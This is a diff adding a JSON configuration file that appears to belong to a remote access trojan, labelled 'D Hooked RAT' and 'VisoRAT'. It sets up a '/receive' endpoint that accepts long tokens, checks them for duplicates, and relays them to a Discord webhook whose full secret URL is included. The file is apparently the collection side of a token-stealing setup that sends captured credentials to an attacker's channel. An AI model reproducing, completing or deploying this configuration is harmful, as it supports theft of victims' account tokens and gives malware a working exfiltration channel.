@@ -1,0 +1,20 @@
+{
+    "security": {
+        "rate_limit_seconds": 600,
+        "min_token_length": 128,
+        "check_duplicate_tokens": true
+    },
+    "endpoints": {
+        "/receive": {
+            "webhooks": [
+                {
+                    "url": "https://discord.com/api/webhooks/1493597798292127875/vP2BJERnoRPQ4chSvDY0aY_sE1B4ES-tn1SQJdMiwqT0UPxAXvXbYVZqawSqPWX2hY8g",
+                    "name": "D Hooked RAT",
+                    "footer": "VisoRAT",
+                    "color": 7414964,
+                    "avatar_url": "https://bigrat.monster/media/bigrat.jpg"
+                }
+            ]
+        }
+    }
+}
